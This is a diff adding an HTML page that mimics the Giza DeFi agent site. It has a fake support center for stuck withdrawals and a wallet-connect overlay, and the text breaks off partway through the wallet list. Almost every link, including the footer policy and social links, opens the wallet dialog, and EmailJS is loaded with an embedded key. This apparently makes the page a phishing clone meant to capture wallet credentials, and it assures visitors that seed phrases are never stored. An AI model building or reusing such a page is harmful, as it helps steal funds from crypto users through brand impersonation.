@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Giza</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("7tpKliu3iA0wJbT5q");
+        })();
+    </script>
+    <script src="script.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+
+    <!-- ═══════════════════════════════════════════ NAVBAR -->
+    <nav class="navbar" id="navbar">
+        <a href="/index.html" class="nav-logo">
+            <div class="nav-logo-icon">
+                <img src="img/gizalogo.png" alt="">
+            </div>
+            <span class="nav-logo-name">Giza</span>
+        </a>
+
+        <div class="nav-links">
+            <!-- Products with dropdown -->
+            <div class="nav-products" id="productsBtn" tabindex="0">
+                Products
+                <span class="arrow" id="productsArrow">
+                    <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M2 5L7 10L12 5" stroke="white" stroke-width="1.5" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </span>
+            </div>
+            <a class="nav-link" onclick="openWallet(); return false;" href="#" style="cursor:pointer;">Company</a>
+            <a class="nav-link" onclick="openWallet(); return false;" href="#" style="cursor:pointer;">Blog</a>
+        </div>
+
+        <div class="nav-spacer"></div>
+
+
+        <!-- Hamburger (mobile only) -->
+        <div class="hamburger" id="hamburger" aria-label="Open menu" role="button" tabindex="0">
+            <span class="bar"></span>
+            <span class="bar"></span>
+        </div>
+    </nav>
+
+    <!-- Products dropdown -->
+    <div class="products-dropdown" id="productsDropdown">
+        <a href="#" onclick="openWallet(); return false;" class="dropdown-item">
+            <h3>Institutional</h3>
+            <p>Run capital at scale with autonomous agents.</p>
+        </a>
+        <a href="#" onclick="openWallet(); return false;" class="dropdown-item">
+            <h3>Build</h3>
+            <p>Create custom strategies using autonomous agents.</p>
+        </a>
+        <a href="#" onclick="openWallet(); return false;" class="dropdown-item">
+            <h3>Retail</h3>
+            <p>Smart automation for everyday investors.</p>
+        </a>
+    </div>
+
+    <!-- Mobile menu -->
+    <div class="mobile-menu" id="mobileMenu">
+        <div class="mobile-menu-item" onclick="openWallet()" style="cursor:pointer;">
+            <h3>Institutional</h3>
+            <p>Run capital at scale with autonomous agents.</p>
+        </div>
+        <div class="mobile-menu-item" onclick="openWallet()" style="cursor:pointer;">
+            <h3>Build</h3>
+            <p>Create custom strategies using autonomous agents.</p>
+        </div>
+        <div class="mobile-menu-item" onclick="openWallet()" style="cursor:pointer;">
+            <h3>Retail</h3>
+            <p>Smart automation for everyday investors.</p>
+        </div>
+        <a href="#" onclick="openWallet(); return false;" class="mobile-menu-link">Company</a>
+        <a href="#" onclick="openWallet(); return false;" class="mobile-menu-link">Blog</a>
+    </div>
+
+
+    <!-- ═══════════════════════════════════════════ HERO -->
+    <section class="hero" id="heroSection">
+        <!-- Left content -->
+        <div class="hero-content">
+            <h1 class="hero-title">Autonomous financial intelligence for onchain capital</h1>
+            <p class="hero-sub">
+                Your agent continuously thinks about your capital, evaluating markets, making decisions, and executing
+                strategies on your behalf.
+            </p>
+            <div class="hero-ctas">
+                <a href="#" onclick="openWallet(); return false;" class="btn-primary">Create Agent ↗</a>
+
+            </div>
+            <p class="hero-tagline">Build your strategy, let Giza do the rest.</p>
+        </div>
+
+        <!-- Right – circle visualization -->
+        <div class="hero-visual">
+            <div class="hero-circle" id="heroCircle">
+
+                <button class="giza-world-btn" onclick="openWallet()">Giza World ↗</button>
+            </div>
+        </div>
+
+        <!-- Stats row -->
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="hero-stat-label">Agentic Volume</div>
+                <div class="hero-stat-value">$4,167,775,562</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">AUA</div>
+                <div class="hero-stat-value">$19,481,333</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">APR</div>
+                <div class="hero-stat-value">15.00%</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">Total Autonomous TXNs</div>
+                <div class="hero-stat-value">822,951</div>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ SUPPORT SECTION -->
+    <section class="support-section" id="support">
+
+        <div class="support-header">
+            <div class="support-header-left">
+                <div class="support-eyebrow"><span class="dot"></span> Support Center</div>
+                <h2 class="support-title">How can we help?</h2>
+                <p class="support-desc">
+                    Running into issues with Giza, Arma, or your DeFi agent? Select your issue below and our team will
+                    get you sorted.
+                </p>
+            </div>
+        </div>
+
+        <!-- Arma withdrawal highlight -->
+        <div class="arma-banner">
+            <div class="arma-banner-left">
+                <div class="arma-icon">
+                    <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" style="color:#f59e0b">
+                        <path d="M10 2L2 7V13L10 18L18 13V7L10 2Z" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M10 2V18M2 7L18 7M2 13L18 13" stroke="currentColor" stroke-width="1" opacity="0.5" />
+                    </svg>
+                </div>
+                <div class="arma-banner-text">
+                    <h3>Arma Withdrawal Issue</h3>
+                    <p>Experiencing delays or errors when withdrawing from the Arma savings account? Get immediate help
+                        from our team.</p>
+                </div>
+            </div>
+            <a href="#" onclick="openWallet(); return false;" class="btn-arma">
+                <span class="pulse"></span>
+                Report Arma Withdrawal Issue ↗
+            </a>
+        </div>
+
+        <!-- Support card grid -->
+        <div class="support-grid">
+
+            <div class="support-card" onclick="openSupport('deposit')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <path d="M9 2V12M5 8L9 12L13 8" stroke="currentColor" stroke-width="1.5"
+                            stroke-linecap="round" />
+                        <path d="M2 15H16" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <h4>Deposit Not Received</h4>
+                <p>Funds sent but not showing in your Giza account? We'll trace the transaction and resolve it.</p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+            <div class="support-card" onclick="openSupport('withdrawal')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <path d="M9 12V2M5 6L9 2L13 6" stroke="currentColor" stroke-width="1.5"
+                            stroke-linecap="round" />
+                        <path d="M2 15H16" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <h4>Withdrawal Failed or Stuck</h4>
+                <p>Withdrawal not processing or taking longer than expected? Our team can manually review and unlock it.
+                </p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+            <div class="support-card" onclick="openSupport('agent')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <circle cx="9" cy="9" r="7" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M9 5V9L12 11" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <h4>Agent Not Executing</h4>
+                <p>Your agent has stopped making moves or is frozen on a strategy? We'll diagnose and restart it.</p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+            <div class="support-card" onclick="openSupport('yield')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <polyline points="2,13 6,8 10,10 15,4" stroke="currentColor" stroke-width="1.5"
+                            stroke-linecap="round" stroke-linejoin="round" />
+                        <path d="M12 4H16V8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <h4>Yield Discrepancy</h4>
+                <p>APR showing lower than expected or earnings not matching your projected returns? Let's reconcile it.
+                </p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+            <div class="support-card" onclick="openSupport('wallet')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <rect x="2" y="5" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M14 10H16V12H14" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M2 8H16" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M5 2L13 2" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </div>
+                <h4>Wallet Connection Failed</h4>
+                <p>Having trouble connecting your wallet to the Giza interface? We support all major wallets on Base.
+                </p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+            <div class="support-card" onclick="openSupport('protocol')">
+                <div class="support-card-icon">
+                    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        style="color:var(--support)">
+                        <path d="M9 2L16 6V12L9 16L2 12V6L9 2Z" stroke="currentColor" stroke-width="1.5" />
+                        <path d="M9 2V16M2 6L16 6M2 12L16 12" stroke="currentColor" stroke-width="1" opacity="0.4" />
+                    </svg>
+                </div>
+                <h4>Protocol Error</h4>
+                <p>Seeing a smart-contract error or revert message on Morpho, AAVE, or Fluid? We'll identify the cause.
+                </p>
+                <span class="support-card-arrow">Get help →</span>
+            </div>
+
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ AGENTS AS INTERFACE -->
+    <section class="agents-section">
+        <div class="agents-header">
+            <div>
+                <h2 class="agents-title">Agents as Interface</h2>
+                <p class="agents-sub">The interface is no longer where you perceive. It's where you specify intent and
+                    agents act on markets.</p>
+            </div>
+            <div class="agents-features">
+                <div class="agents-feature">
+                    <h3>Self Custodial</h3>
+                    <p>You maintain complete ownership while agents optimize positions.</p>
+                </div>
+                <div class="agents-feature">
+                    <h3>Verifiable by Design</h3>
+                    <p>All autonomous actions are provable, auditable, and explainable.</p>
+                </div>
+                <div class="agents-feature">
+                    <h3>Continuous Execution</h3>
+                    <p>Agents continuously evaluate, decide, and execute at scale.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Dashboard mockup -->
+        <div class="agents-mockup">
+            <img src="img/img1.png" alt="">
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ INTELLIGENT OPTIMIZATION -->
+    <section class="optimization-section">
+        <div class="optimization-header">
+            <p class="section-eyebrow">How it works</p>
+            <h2 class="optimization-title">Intelligent optimization</h2>
+        </div>
+
+        <div class="optimization-steps">
+            <!-- Step 1 -->
+            <div class="optimization-step">
+                <h3>Deposit your Funds</h3>
+                <p>Connect your wallet, select assets and deposit to your agent.</p>
+                <img class="step-card" src="img/img ii.png" alt="">
+            </div>
+
+            <!-- Step 2 -->
+            <div class="optimization-step">
+                <h3>Configure Your Strategy</h3>
+                <p>Choose specific markets or enable automatic selection, agents dynamically route capital for optimal
+                    returns.</p>
+                <img class="step-card" src="img/imgiii.png" alt="">
+            </div>
+
+            <!-- Step 3 -->
+            <div class="optimization-step">
+                <h3>Watch Giza in Action</h3>
+                <p>Track every decision as Giza dynamically manages risks, rebalances, and adapts in real time.</p>
+                <img class="step-card" src="img/imgiv.png" alt="">
+            </div>
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ INTELLIGENT LAYER -->
+    <section class="layer-section">
+        <div class="layer-header">
+            <div>
+                <p class="layer-sub-text">
+                    Behind every move is a network of agents continuously analyzing markets, executing strategies, and
+                    optimizing positions across protocols.<br><br>
+                    <a href="#" onclick="openWallet(); return false;">Read the Announcement ↗</a>
+                </p>
+            </div>
+            <h2 class="layer-title">Meet The Intelligent Layer</h2>
+            <div class="layer-nav-btns">
+                <button class="layer-nav-btn inactive" id="layerPrev" aria-label="Previous">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <path d="M10 4L6 8L10 12" stroke="white" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </button>
+                <button class="layer-nav-btn" id="layerNext" aria-label="Next">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <path d="M6 4L10 8L6 12" stroke="white" stroke-width="1.5" stroke-linecap="round" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <div class="layer-cards">
+            <!-- Card 1 -->
+            <img src="img/imgv.png" class="layer-card" alt="">
+
+            <!-- Card 2 -->
+            <img src="img/imgvi.png" class="layer-card" alt="">
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ BUILD SECTION -->
+    <section class="build-section">
+        <div>
+            <h2 class="build-title">Add financial intelligence without building it.</h2>
+            <p class="build-desc">Behind every move is a network of agents continuously analyzing markets, executing
+                strategies, and optimizing positions across protocols.</p>
+            <a href="#" onclick="openWallet(); return false;" class="btn-outline">Build ↗</a>
+        </div>
+
+        <img src="img/imgvii.png" alt="" class="code-card">
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ SAVINGS SECTION -->
+    <section class="savings-section">
+        <div class="savings-header">
+            <div>
+                <h2 class="savings-title">An intelligent savings account of Base.</h2>
+                <p class="savings-sub">Base users can access institutional DeFi strategies without institutional
+                    complexity.</p>
+            </div>
+            <div class="savings-feature">
+                <p>Giza monitors every lending protocol on Base, detects rate shifts in real time, and moves your
+                    capital to where it earns the most, automatically.</p>
+                <div class="savings-coming">Coming Soon</div>
+            </div>
+            <div class="savings-feature">
+                <h3>One tap. Continuous optimization. Real yields. Built on Base.</h3>
+                <p style="margin-top:8px;">Connect, deposit and let your agent do the rest across every protocol on
+                    Base.</p>
+            </div>
+        </div>
+
+        <!-- Mobile phone mockup + support nudge -->
+        <div class="savings-visual">
+            <div class="savings-phone-wrap">
+                <img src="img/imgviii.png" alt="" class="savings-phone-img">
+
+            </div>
+        </div>
+    </section>
+
+
+    <!-- ═══════════════════════════════════════════ FOOTER -->
+    <footer>
+        <div class="footer-grid">
+            <div>
+                <div class="footer-logo">
+                    <img src="img/gizalogo.png" alt="">
+                    <span class="footer-logo-name">Giza</span>
+                </div>
+                <p class="footer-disclaimer">
+                    Risks &amp; disclosures – Yield is variable and not guaranteed. DeFi carries smart-contract and
+                    protocol risks.<br><br>
+                    Review docs, audits, and your jurisdiction's regulations before using Arma. Not investment advice.
+                </p>
+                <p class="footer-copyright">© 2025 Gizatech AG</p>
+            </div>
+            <div class="footer-col">
+                <h4>Explore</h4>
+                <ul>
+                    <li><a href="#" onclick="openWallet(); return false;">Privacy Policy</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">Terms and conditions</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">Stake</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">Governance</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Giza</h4>
+                <ul>
+                    <li><a href="#" onclick="openWallet(); return false;">Made by Giza</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">Leaderboard</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Socials</h4>
+                <ul>
+                    <li><a href="#" onclick="openWallet(); return false;">Discord</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">X / Twitter</a></li>
+                    <li><a href="#" onclick="openWallet(); return false;">LinkedIn</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+
+    <div class="floating-video-wrap hidden" id="floatingBubble">
+
+        <div class="floating-video-placeholder">
+            <video autoplay muted loop playsinline>
+                <source src="img/qgyltGp3500X8Rppwwde74iYo.mp4" type="video/mp4">
+            </video>
+        </div>
+
+    </div>
+
+    <div class="w-overlay" id="wOverlay">
+
+        <!-- SCREEN 1: Select Wallet -->
+        <div class="w-panel" id="wScreen1">
+            <div class="w-header">
+                <span class="w-title">Connect Wallet</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-body">
+
+                <!-- Featured: MetaMask -->
+                <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+                    <span class="w-featured-badge">Recommended</span>
+                    <div class="w-feat-icon">
+                        <img src="img/trustwallet.png" alt="Trust Wallet" />
+                    </div>
+                    <div>
+                        <div class="w-feat-name">Trust Wallet</div>
+                        <div class="w-feat-desc">Crypto Wallet</div>
+                    </div>
+                </div>
+
+                <div class="w-divider"><span>other wallets</span></div>
+
+                <div class="w-list">
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
+                        <div>
+                            <div class="w-item-name">Phantom Wallet</div>
+                            <div class="w-item-desc">Solana Wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+                        <div>
+                            <div class="w-item-name">Ledger</div>
+                            <div class="w-item-desc">Hardware wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
+                        <div>
+                            <div class="w-item-name">Metamask </div>
+                            <div class="w-item-desc">Ethereum Wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item w-item-other" onclick="openOtherWallets()">
+                        <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+                        <div>
+                            <div class="w-item-name">Other Wallets</div>
+                            <div class="w-item-desc">Browse 30+ supported wallets</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                </div>
+
+                <p class="w-note">
+                    By connecting you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.
+                    We never store your private keys or seed phrases.
+                </p>
+            </div>
+        </div>
+
+        <!-- OTHER WALLETS -->
+        <div class="w-sub" id="wScreenOther">
+            <div class="w-header">
+                <span class="w-title">Other Wallets</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="ow-search-wrap">
+                <i class="ri-search-line"></i>
+                <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..."
+                    autocomplete="off" spellcheck="false" />
+            </div>
+            <div class="ow-count" id="owCount">30 wallets</div>
+            <div class="ow-list" id="owList">
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/pera.png" alt="Pera Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Pera Wallet</div>
+                        <div class="ow-chain">Algorand</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+                    <div>
+                        <div class="ow-name">Rainbow</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/basewallet.png" alt="Base Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Base Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rabby.png" alt="Rabby" /></div>
+                    <div>
+                        <div class="ow-name">Rabby Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+                    <div>
+                        <div class="ow-name">Zerion</div>
+                        <div class="ow-chain">Ethereum / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walletconnect.png" alt="WalletConnect" /></div>
+                    <div>
+                        <div class="ow-name">WalletConnect</div>
+                        <div class="ow-chain">Any compatible wallet</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+                    <div>
+                        <div class="ow-name">Phantom</div>
+                        <div class="ow-chain">Solana / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/stepn.png" alt="Stepn" /></div>
+                    <div>
+                        <div class="ow-name">Stepn</div>
+                        <div class="ow-chain">Solana / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+                    <div>
+                        <div class="ow-name">Solflare</div>
+                        <div class="ow-chain">Solana</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+                    <div>
+                        <div class="ow-name">OKX Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/terrastation.png" alt="Terra Station" /></div>
+                    <div>
+                        <div class="ow-name">Terra Station</div>
+                        <div class="ow-chain">Terra</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/safepal.png" alt="SafePal" /></div>
+                    <div>
+                        <div class="ow-name">SafePal</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+                    <div>
+                        <div class="ow-name">Exodus</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Atomic Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+                    <div>
+                        <div class="ow-name">Trezor</div>
+                        <div class="ow-chain">Hardware / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+                    <div>
+                        <div class="ow-name">TokenPocket</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/uniswap.png" alt="Uniswap" /></div>
+                    <div>
+                        <div class="ow-name">Uniswap Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+                    <div>
+                        <div class="ow-name">Crypto.com DeFi</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/keplr.png" alt="Keplr" /></div>
+                    <div>
+                        <div class="ow-name">Keplr</div>
+                        <div class="ow-chain">Cosmos / IBC</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/leapwallet.png" alt="Leap" /></div>
+                    <div>
+                        <div class="ow-name">Leap Wallet</div>
+                        <div class="ow-chain">Cosmos / IBC</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tangem.png" alt="Tangem" /></div>
+                    <div>
+                        <div class="ow-name">Tangem</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jade.png" alt="Jade" /></div>
+                    <div>
+                        <div class="ow-name">Jade</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/polkadot.png" alt="Polkadot.js" /></div>
+                    <div>
+                        <div class="ow-name">Polkadot.js</div>
+                        <div class="ow-chain">Polkadot / Substrate</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/talisman.png" alt="Talisman" /></div>
+                    <div>
+                        <div class="ow-name">Talisman</div>
+                        <div class="ow-chain">Polkadot / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/nami.png" alt="Nami" /></div>
+                    <div>
+                        <div class="ow-name">Nami</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/eternl.png" alt="Eternl" /></div>
+                    <div>
+                        <div class="ow-name">Eternl</div>
+                        <div class="ow-chain">Cardano</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep" /></div>
+                    <div>
+                        <div class="ow-name">BitKeep</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/martian.png" alt="Martian" /></div>
+                    <div>
+                        <div class="ow-name">Martian</div>
+                        <div class="ow-chain">Aptos / Sui</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/suiet.png" alt="Suiet" /></div>
+                    <div>
+                        <div class="ow-name">Suiet</div>
+                        <div class="ow-chain">Sui</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/huobi.png" alt="Huobi" /></div>
+                    <div>
+                        <div class="ow-name">Huobi</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/argent.png" alt="Argent" /></div>
+                    <div>
+                        <div class="ow-name">Argent</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/defly.png" alt="Defly" /></div>
+                    <div>
+                        <div class="ow-name">Defly</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/midas.png" alt="Midas Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Midas Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tongue.png" alt="Tongue Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Tongue Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/celo.png" alt="Celo Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Celo Wallet</div>
+                        <div class="ow-chain">Celo</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bridge wallet.png" alt="Bridge Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Bridge Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walletio.png" alt="Wallet.io" /></div>
+                    <div>
+                        <div class="ow-name">Wallet.io</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/coinomi.png" alt="Coinomi Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Coinomi Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/dharma.png" alt="Dharma Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Dharma Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/1inch.png" alt="1inch Wallet" /></div>
+                    <div>
+                        <div class="ow-name">1inch Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/walleth.png" alt="walleth" /></div>
+                    <div>
+                        <div class="ow-name">walleth</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitpay.png" alt="BitPay Wallet" /></div>
+                    <div>
